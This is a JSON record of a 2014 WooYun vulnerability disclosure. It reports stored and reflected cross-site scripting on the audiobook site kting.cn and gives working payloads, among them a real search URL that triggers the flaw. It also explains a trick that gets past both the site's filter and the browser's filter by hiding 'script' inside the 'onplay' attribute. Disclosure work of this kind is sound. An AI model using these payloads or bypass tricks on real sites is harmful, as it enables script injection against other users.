{"id": 51552, "wybug_id": "wooyun-2014-074111", "wybug_title": "酷听网XSS小礼包（存储+绕过浏览器filter反射）", "wybug_corp": "酷听网", "wybug_author": "story", "wybug_date": "2014-08-28 11:06", "wybug_open_date": "2014-10-12 11:10", "wybug_type": "xss跨站脚本攻击", "wybug_level": "中", "wybug_rank_0": "8", "wybug_status": "未联系到厂商或者厂商积极忽略", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["存储型", "黑盒测试技巧"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-08-28：\t积极联系厂商并且等待厂商认领中，细节不对外公开\t\t\t\t\t\t\t\t\t2014-10-12：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： 最爱听书了，找找酷听网的漏洞吧~ 详细说明：  酷听网（kting.cn）全站使用了一个xss过滤器，就是那个在敏感词内加<x>的很常用的一个过滤器。但经过我的fuzz，发现onplay并未过滤，所以我们可以构造一个自动触发的payload。同时，经过我的fuzz，“/”会截断整个字符串，但可以将字符串进行URL编码，发送后会自动转换成原字符。payload如下：\n<video src=\"http:%2F%2Fwww.w3school.com.cn%2Fi%2Fmovie.ogg\" autoplay onplay=eval(\"alert(1)\")>\n   漏洞证明：  1.存储型XSS。个人简介的位置插入：\n<video src=\"http:%2F%2Fwww.w3school.com.cn%2Fi%2Fmovie.ogg\" autoplay onplay=eval(\"alert(1)\")>\n即可弹窗。登录后可以看到：\n\n地址（需要登录）：http://me.kting.cn/msspace/uid/2415861/index.html2.反射型xss，绕过浏览器filterpayload原理相同，地址：\nhttp://www.kting.cn/search/keyword/aaaa%22%3E%3Cvideo%20src%3D%22http%3A%2F%2Fwww.w3school.com.cn%2Fi%2Fmovie.ogg%22%20autoplay%20oscriptnplay%3Dalert(1)%3E\n\n\n绕过filter的方法就是，在“关键词”的中间插入“敏感词”，比如将onplay变成oscriptnplay，而这里的script会被过滤掉，所以输出的就是onplay，由此绕过了浏览器filter。   修复方案：  htmlspecialchars   版权声明：转载请注明来源 story@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 未能联系到厂商或者厂商积极拒绝  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}